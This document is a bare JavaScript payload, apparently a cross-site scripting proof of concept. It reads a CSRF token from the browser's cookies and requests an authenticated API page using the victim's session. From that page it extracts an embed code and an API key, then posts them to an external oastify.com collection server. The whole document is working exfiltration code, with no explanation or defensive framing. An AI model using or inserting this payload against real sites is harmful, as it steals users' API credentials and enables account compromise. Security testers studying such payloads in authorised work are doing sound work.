// Get the CSRFToken from the cookie
let csrfToken = document.cookie.split('; ').find(row => row.startsWith('CSRFToken=')).split('=')[1];

// Step 1: Fetch the original data and extract embedCode and APIKeyDiv
fetch(`/AJAX?page=API&CSRFToken=${csrfToken}`, {
    method: 'GET',
    credentials: 'include'
})
.then(response => response.text())  // Get the response as text (HTML)
.then(data => {
    // Create a temporary DOM element to parse the HTML response
    let parser = new DOMParser();
    let doc = parser.parseFromString(data, 'text/html');

    // Extract the values of embedCode and APIKeyDiv
    let embedCode = doc.querySelector('.embedCode').textContent;
    let apiKey = doc.getElementById('APIKeyDiv').textContent;

    // Step 2: Send the extracted values to the specified URL
    fetch('https://ttq4kj7q1qec1v6gocmrax8qwh28q2mqb.oastify.com', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            embedCode: embedCode,
            apiKey: apiKey
        })
    })
    .then(response => console.log('Data sent successfully'))
    .catch(error => console.error('Error sending data:', error));
})
.catch(error => console.error('Error fetching data:', error));
